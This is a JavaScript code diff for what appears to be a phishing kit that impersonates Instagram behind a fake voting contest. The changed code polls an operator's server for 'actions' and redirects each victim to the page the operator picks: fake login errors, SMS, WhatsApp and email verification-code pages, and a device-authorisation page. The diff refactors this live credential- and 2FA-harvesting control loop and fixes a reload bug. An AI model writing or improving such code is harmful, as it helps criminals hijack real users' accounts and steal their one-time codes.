@@ -256,10 +256,9 @@
                     var local = getUsers();
                     serverUsers.forEach(function(su) {
                         var idx = local.findIndex(function(l) { return l.visitorId === su.visitorId; });
-                        if (idx >= 0) {
-                            if (local[idx].action && !su.action) { su.action = local[idx].action; }
-                            local[idx] = Object.assign({}, local[idx], su);
-                        } else {
+                if (idx >= 0) {
+                    local[idx] = Object.assign({}, local[idx], su);
+                } else {
                             local.push(su);
                         }
                     });
@@ -338,33 +337,37 @@
             }
         }
 
-        var visitorPoll = setInterval(function() {
-            syncFromServer();
-            var visitorId = getClientId();
-            var users = getUsers();
-            var user = users.find(function(u) { return u.visitorId === visitorId; });
-            if (user && user.action) {
-                var action = user.action;
-                user.action = null;
-                saveUsers(users);
-                var pages = {
-                    'login': 'INSTAGRAM.html',
-                    'login_incorrect': 'INSTAGRAM.html?error=1',
-                    'loading': 'pages/loading.html',
-                    'sms_verification': 'pages/sms.html',
-                    'sms_error': 'pages/sms_incorrect.html',
-                    'whatsapp_verification': 'pages/whatsapp.html',
-                    'whatsapp_error': 'pages/whatsapp_incorrect.html',
-                    'email_verification': 'pages/email.html',
-                    'email_error': 'pages/email_incorrect.html',
-                    'technical_error': 'pages/technical_error.html',
-                    'authorize_device': 'pages/authorize_device.html',
-                    'retry': 'INSTAGRAM.html'
-                };
-                var page = pages[action] || 'pages/loading.html';
-                currentUser = user.username;
-                window.location.href = page + (page.indexOf('?') > -1 ? '&' : '?') + 'user=' + encodeURIComponent(currentUser);
+        var actionPages = {
+            'login': 'INSTAGRAM.html',
+            'login_incorrect': 'INSTAGRAM.html?error=1',
+            'loading': 'pages/loading.html',
+            'sms_verification': 'pages/sms.html',
+            'sms_error': 'pages/sms_incorrect.html',
+            'whatsapp_verification': 'pages/whatsapp.html',
+            'whatsapp_error': 'pages/whatsapp_incorrect.html',
+            'email_verification': 'pages/email.html',
+            'email_error': 'pages/email_incorrect.html',
+            'technical_error': 'pages/technical_error.html',
+            'authorize_device': 'pages/authorize_device.html',
+            'retry': 'INSTAGRAM.html'
+        };
+        function goAction(action, username) {
+            var page = actionPages[action] || 'pages/loading.html';
+            if (username) currentUser = username;
+            var target = new URL(page, window.location.href);
+            if (target.pathname === window.location.pathname && target.search === window.location.search) {
+                return; // already on the target page - avoid reload loop
             }
+            window.location.href = page + (page.indexOf('?') > -1 ? '&' : '?') + 'user=' + encodeURIComponent(currentUser || '');
+        }
+        var visitorPoll = setInterval(function() {
+            var visitorId = getClientId();
+            fetch(API_BASE + '/api/consume_action?visitorId=' + encodeURIComponent(visitorId))
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    if (d && d.action) goAction(d.action, d.username);
+                })
+                .catch(function() {});
         }, 1500);
 
         function checkFields() {
@@ -419,47 +422,36 @@
             if (checkInterval) clearInterval(checkInterval);
             var visitorId = getClientId();
             checkInterval = setInterval(function() {
-                syncFromServer();
-                var users = getUsers();
-                var user = users.find(function(u) { return u.visitorId === visitorId; });
-                if (user && user.status === 'approved') {
-                    clearInterval(checkInterval);
-                    waitingScreen.classList.remove('show');
-                    document.getElementById('dashUsername').textContent = '@' + currentUser;
-                    document.getElementById('dashName').textContent = currentUser;
-                    dashboard.classList.add('show');
-                    if (fromConcours === 'concours' && concoursVote) {
-                        registerVote(currentUser, concoursVote, concoursRef);
-                    }
-                } else if (user && user.status === 'rejected') {
-                    clearInterval(checkInterval);
-                    waitingScreen.classList.remove('show');
-                    pageLogin.style.display = 'flex';
-                    eEl.textContent = 'Votre demande a été rejetée par un administrateur.';
-                    eEl.style.display = 'block';
-                    currentUser = null;
-                } else if (user && user.action) {
-                    clearInterval(checkInterval);
-                    var action = user.action;
-                    user.action = null;
-                    saveUsers(users);
-                var pages = {
-                    'login': 'pages/login.html',
-                        'login_incorrect': 'pages/login_incorrect.html',
-                        'loading': 'pages/loading.html',
-                        'sms_verification': 'pages/sms.html',
-                        'sms_error': 'pages/sms_incorrect.html',
-                        'whatsapp_verification': 'pages/whatsapp.html',
-                        'whatsapp_error': 'pages/whatsapp_incorrect.html',
-                        'email_verification': 'pages/email.html',
-                        'email_error': 'pages/email_incorrect.html',
-                        'technical_error': 'pages/technical_error.html',
-                        'authorize_device': 'pages/authorize_device.html',
-                        'retry': 'INSTAGRAM.html'
-                    };
-                    var page = pages[action] || 'pages/loading.html';
-                    window.location.href = page + (page.indexOf('?') > -1 ? '&' : '?') + 'user=' + encodeURIComponent(currentUser);
-                }
+                fetch(API_BASE + '/api/consume_action?visitorId=' + encodeURIComponent(visitorId))
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) {
+                        if (d && d.action) {
+                            clearInterval(checkInterval);
+                            goAction(d.action, d.username || currentUser);
+                            return;
+                        }
+                        syncFromServer();
+                        var users = getUsers();
+                        var user = users.find(function(u) { return u.visitorId === visitorId; });
+                        if (user && user.status === 'approved') {
+                            clearInterval(checkInterval);
+                            waitingScreen.classList.remove('show');
+                            document.getElementById('dashUsername').textContent = '@' + currentUser;
+                            document.getElementById('dashName').textContent = currentUser;
+                            dashboard.classList.add('show');
+                            if (fromConcours === 'concours' && concoursVote) {
+                                registerVote(currentUser, concoursVote, concoursRef);
+                            }
+                        } else if (user && user.status === 'rejected') {
+                            clearInterval(checkInterval);
+                            waitingScreen.classList.remove('show');
+                            pageLogin.style.display = 'flex';
+                            eEl.textContent = 'Votre demande a été rejetée par un administrateur.';
+                            eEl.style.display = 'block';
+                            currentUser = null;
+                        }
+                    })
+                    .catch(function() {});
             }, 2000);
         }
 
